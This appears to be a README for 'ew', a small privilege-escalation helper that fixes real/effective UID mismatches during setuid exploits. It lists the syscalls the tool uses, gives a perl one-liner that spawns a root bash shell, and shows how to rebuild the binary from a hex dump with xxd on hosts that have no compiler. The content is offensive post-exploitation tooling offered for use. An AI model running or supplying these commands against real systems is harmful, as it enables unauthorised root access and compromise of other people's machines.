# ew #

_ew_ is a simple wrapper program for circumventing ruid / euid mistmatches during a suid exploit. It's so simple, the code is really self documenting. 

	geteuid();
	setreuid();
	setregid();
	execve();

Another quick method if perl is available would be:
	perl -U -e '$<=$(=$>;system("/bin/bash");'

Enjoy!

## ew shellcode ##

The files with shellcode are the same ew, but were built with '-Os' and then stripped, before being run through xxd -p. This is useful when the target host has xxd but no compiler.

	cat ew-x64-shellcode.hex | xxd -p -r > ew
